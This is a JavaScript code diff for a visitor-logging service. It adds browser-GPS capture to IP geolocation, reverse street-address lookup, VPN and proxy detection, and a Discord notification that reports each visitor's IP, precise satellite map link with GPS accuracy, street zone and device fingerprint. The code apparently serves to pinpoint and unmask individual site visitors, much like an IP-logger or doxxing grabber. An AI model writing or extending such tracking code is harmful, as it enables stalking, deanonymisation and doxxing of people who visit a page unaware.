@@ -75,9 +75,30 @@ function countryName(code, fallback) {
 
 async function geoLookup(ip, hint = {}) {
   const fallback = { country: 'Desconocido', countryCode: '', region: '', city: '', isp: '', src: '' };
+  if (hint.gps && hint.gps.lat && hint.gps.lon) {
+    const info = {
+      country: '', countryCode: '', region: '', city: '', isp: '',
+      lat: hint.gps.lat, lon: hint.gps.lon, acc: hint.gps.acc || null,
+      src: 'gps-navegador',
+    };
+    try {
+      const res = await fetch(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,timezone,isp,org,as,mobile,proxy,hosting`, { signal: AbortSignal.timeout(5000) });
+      const data = await res.json();
+      if (data.status === 'success') {
+        info.country = data.country || ''; info.countryCode = data.countryCode || '';
+        info.tz = data.timezone || ''; info.isp = data.isp || ''; info.org = data.org || '';
+        info.asn = data.as || ''; info.mobile = !!data.mobile;
+        info.proxy = !!data.proxy; info.hosting = !!data.hosting;
+        info.src = 'gps-navegador+ip-api';
+      }
+    } catch {}
+    const street = await reverseStreet(info.lat, info.lon);
+    if (street) { info.street = street.zone; info.addr = street.label; }
+    return { ...info, ...vpnCheck(info, hint) };
+  }
   const hintOnly = () => ({
     country: countryName(hint.countryCode || hint.country, hint.country), countryCode: hint.countryCode || '',
-    region: hint.region || '', city: hint.city || '', isp: '',
+    region: hint.region || '', city: hint.city || '', isp: '',  
     src: 'vercel-edge',
   });
   if (isPrivateIp(ip)) return { ...fallback, country: 'Local/Privada' };
@@ -181,7 +202,7 @@ export const notify = {
     const botFlags = (bots || []).join(', ');
     const fpLine = [f.plat, f.scr, f.lang, f.tz].filter(Boolean).join(' · ') || '—';
     const mapsUrl = (geo.lat && geo.lon)
-      ? `https://www.google.com/maps/@?api=1&map_action=map&center=${geo.lat},${geo.lon}&zoom=16&basemap=satellite`
+      ? `https://www.google.com/maps/@?api=1&map_action=map&center=${geo.lat},${geo.lon}&zoom=${geo.acc ? 18 : 15}&basemap=satellite`
       : ((geo.city || geo.region || geo.countryCode) ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent([geo.city, geo.region, geo.countryCode].filter(Boolean).join(', '))}` : '');
 
     await sendDiscord(
@@ -194,7 +215,7 @@ export const notify = {
 🌍 País: ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}${geo.city ? ` — ${geo.city}${geo.region ? ', ' + geo.region : ''}` : ''}${geo.isp ? ` — ${geo.isp}` : ''}
 🌐 IP: ${ip || 'desconocida'}${geo.asn ? ` — ${geo.asn}` : ''}${geo.src ? ` (geo: ${geo.src})` : ''}${geo.mobile ? ' · 📶 IP móvil' : ''}
 🛡️ VPN/Proxy: ${geo.vpn ? `SÍ (${(geo.vpnReasons || []).join(' + ')})` : 'no'}${mapsUrl ? `
-📍Maps Ubi: ${mapsUrl}` : ''}${geo.street ? `
+📍Maps Ubi: ${mapsUrl}${geo.acc ? ` (GPS ±${Math.round(geo.acc)} m)` : ''}` : ''}${geo.street ? `
 🏠 Zona: ${geo.street}` : ''}
 📱 Dispositivo: ${device} · ${os} · ${browser}
 🖥️ Huella: ${fpLine}${f.cores ? ` · ${f.cores} núcleos` : ''}${f.touch ? ` · táctil x${f.touch}` : ''}
